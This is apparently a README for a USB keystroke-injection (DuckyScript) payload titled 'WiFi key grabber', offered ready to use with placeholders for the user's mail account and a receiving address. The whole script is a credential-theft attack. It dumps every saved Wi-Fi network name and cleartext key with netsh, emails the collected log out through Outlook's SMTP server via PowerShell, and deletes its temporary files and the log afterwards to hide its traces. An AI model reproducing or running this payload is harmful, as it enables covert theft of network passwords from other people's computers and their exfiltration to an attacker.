### Change the following things:
* **ACCOUNT**: Your **hotmail/outlook account**
* **PASSWORD**: Your **hotmail/outlook password**
* **RECEIVER**: The email you want to send the content of Log.txt to

```
DELAY 1000
REM --> Minimize all windows
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200
REM --> Get all SSID
STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
ENTER
REM --> Create a filter.bat to get all the profile names
STRING echo setlocal enabledelayedexpansion^
ENTER
ENTER
STRING for /f "tokens=5*" %%i in (a.txt) do (^
ENTER
ENTER
STRING set val=%%i %%j^
ENTER
ENTER
STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
ENTER
ENTER
STRING echo !val!^>^>b.txt) > filter.bat
ENTER
REM --> Run filter.bat and save all profile names in b.txt
STRING filter.bat
DELAY 300
ENTER
REM --> Save all the good stuff in Log.txt and delete the other garbage files
STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
ENTER
DELAY 1000
STRING del a.txt b.txt filter.bat
ENTER
REM --> Mail Log.txt
STRING powershell
ENTER
DELAY 1000
STRING $SMTPServer = 'smtp-mail.outlook.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSSL = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<your email here>', '<your password here>')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = '<your email here>'
ENTER
STRING $ReportEmail.To.Add('<email to send to>')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 3000
STRING exit
ENTER
DELAY 500
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER

```


### Note:

This script will grab not just the current SSID and password your computer is connecting to but every single SSID and password you have previously connected/saved on your computer. And it works even if the WiFi name contains special characters (such as a smiley face) or spaces. I'm not using gmail here because Google is pretty restrictive when it comes to 3rd party app authentication (let me know if it works with other mail server such as yahoo, zoho, etc)

You might want to adjust the DELAY depending on the system you are running e.g set a higher delay time if your system is slow.